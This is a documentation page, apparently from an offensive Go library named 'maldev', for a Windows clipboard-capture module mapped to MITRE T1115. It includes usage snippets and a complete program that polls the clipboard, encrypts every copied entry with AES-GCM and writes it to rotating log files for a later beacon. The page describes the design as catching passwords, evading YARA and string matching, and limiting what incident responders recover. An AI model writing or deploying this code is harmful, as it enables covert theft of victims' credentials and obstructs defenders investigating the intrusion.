# Clipboard Capture

[<- Back to Collection Overview](README.md)

**MITRE ATT&CK:** [T1115 - Clipboard Data](https://attack.mitre.org/techniques/T1115/)
**Package:** `collection/clipboard`
**Platform:** Windows
**Detection:** Medium

---

## For Beginners

Users frequently copy passwords, credentials, and sensitive data to the clipboard. This technique reads clipboard text on demand or monitors it for changes, capturing everything the user copies.

---

## How It Works

```mermaid
sequenceDiagram
    participant User
    participant App as Application
    participant Clipboard as Windows Clipboard
    participant Monitor as clipboard.Watch()

    User->>App: Ctrl+C (copy password)
    App->>Clipboard: SetClipboardData(CF_UNICODETEXT)
    Clipboard->>Clipboard: Increment sequence number

    loop Every pollInterval
        Monitor->>Clipboard: GetClipboardSequenceNumber()
        Note over Monitor: Changed?
        Monitor->>Clipboard: OpenClipboard + GetClipboardData
        Clipboard-->>Monitor: "MyP@ssw0rd123"
        Monitor->>Monitor: Send to channel
    end
```

---

## Usage

```go
import "github.com/oioio-space/maldev/collection/clipboard"

// One-shot read
text, err := clipboard.ReadText()

// Continuous monitoring
for content := range clipboard.Watch(ctx, 500*time.Millisecond) {
    fmt.Println("Copied:", content)
}
```

---

## Combined Example

Watch the clipboard for new text, encrypt each entry with AES-GCM before it
ever touches a file, and stash the ciphertext in a per-day log that a later
beacon can pick up — credentials never appear in plaintext on disk.

```go
package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/oioio-space/maldev/collection/clipboard"
	"github.com/oioio-space/maldev/crypto"
)

func main() {
	key, err := crypto.NewAESKey()
	if err != nil {
		log.Fatal(err)
	}

	// Per-day log — rotate automatically, limits blast radius per file.
	logPath := fmt.Sprintf("clip-%s.bin", time.Now().Format("2006-01-02"))
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	for text := range clipboard.Watch(context.Background(), 500*time.Millisecond) {
		blob, _ := crypto.EncryptAESGCM(key, []byte(text))
		_, _ = f.Write(blob)
	}
}
```

Layered benefit: clipboard monitoring catches credentials in transit (password managers, browsers, terminals all copy-paste through the same channel), AES-GCM encryption means the on-disk artifact is opaque to YARA/string-matching, and per-day rotation limits what an incident responder recovers from a single artefact.

---

## API Reference

See [collection.md](../../collection.md#collectionclipboard----clipboard-monitoring)
